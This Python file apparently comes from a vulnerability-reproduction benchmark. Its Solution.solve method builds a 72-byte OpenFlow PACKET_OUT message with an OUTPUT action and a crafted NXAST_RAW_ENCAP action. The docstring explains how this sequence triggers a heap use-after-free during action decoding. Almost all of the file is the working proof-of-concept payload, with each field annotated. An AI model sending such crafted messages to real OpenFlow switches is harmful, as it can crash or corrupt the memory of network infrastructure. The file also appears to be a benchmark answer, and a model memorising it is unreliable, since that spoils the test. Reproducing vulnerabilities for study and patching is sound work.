import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap use-after-free vulnerability
        in the decoding of RAW_ENCAP actions.

        The PoC is an OpenFlow OFPT_PACKET_OUT message with a crafted
        sequence of actions. The total length of the PoC is 72 bytes,
        matching the ground-truth length.

        The vulnerability is triggered by the following sequence:
        1. An ofpbuf is allocated to hold decoded actions, with a size
           determined by the `actions_len` field (48 bytes in this PoC).
        2. A small first action (OFPAT_OUTPUT, 8 bytes on the wire) is
           decoded. Its internal representation is larger (e.g., 16 bytes),
           partially filling the ofpbuf.
        3. The second action (NXAST_RAW_ENCAP, 40 bytes) is decoded. A pointer
           to the action's data ('encap') is stored.
        4. The action's properties are then decoded. The decoded properties
           require more space than is available in the ofpbuf.
        5. The ofpbuf is reallocated, freeing the old memory block and
           invalidating the 'encap' pointer.
        6. The decoding function continues to use the stale 'encap' pointer,
           resulting in a write-after-free.
        """

        # OpenFlow 1.3 Header (8 bytes)
        # Type: 13 (OFPT_PACKET_OUT)
        # Length: 72 bytes (total PoC size)
        ofp_header = struct.pack(
            '>BBHI',
            4,   # version = 4 (OF 1.3)
            13,  # type = 13 (OFPT_PACKET_OUT)
            72,  # length
            0    # xid
        )

        # OFPT_PACKET_OUT body (16 bytes)
        # actions_len is 48 bytes (8 for output + 40 for raw_encap)
        packet_out_body = struct.pack(
            '>IIH',
            0xFFFFFFFF,  # buffer_id = -1
            0xFFFFFFFD,  # in_port = OFPP_CONTROLLER
            48           # actions_len
        ) + b'\x00' * 6  # padding

        # Action 1: OFPAT_OUTPUT (8 bytes)
        # A small action to set up the heap layout.
        action_output = struct.pack(
            '>HHHH',
            0,  # type = 0 (OFPAT_OUTPUT)
            8,  # len
            1,  # port
            0   # max_len
        )

        # Action 2: NXAST_RAW_ENCAP (40 bytes)
        # The vulnerable action.
        
        # Part 1: nx_action_encap header (16 bytes)
        nx_action_header = struct.pack(
            '>HHIHHHH',
            0xFFFF,      # type = OFPAT_VENDOR
            40,          # len = 40 (16 header + 24 properties)
            0x00002320,  # vendor = NX_VENDOR_ID
            37,          # subtype = NXAST_RAW_ENCAP
            0,           # ofp_version
            0,           # packet_type
            0,           # len_offset
            0            # crc_offset
        )

        # Part 2: Properties (24 bytes)
        # A property that, when decoded, overflows the buffer.
        prop_experimenter = struct.pack(
            '>HHII',
            0xFFFF,      # type = OFPPPT_EXPERIMENTER
            24,          # len = 24
            0,           # experimenter
            0            # exp_type
        ) + b'\x00' * 12  # data

        action_raw_encap = nx_action_header + prop_experimenter

        # Assemble the final PoC
        poc = ofp_header + packet_out_body + action_output + action_raw_encap
        
        return poc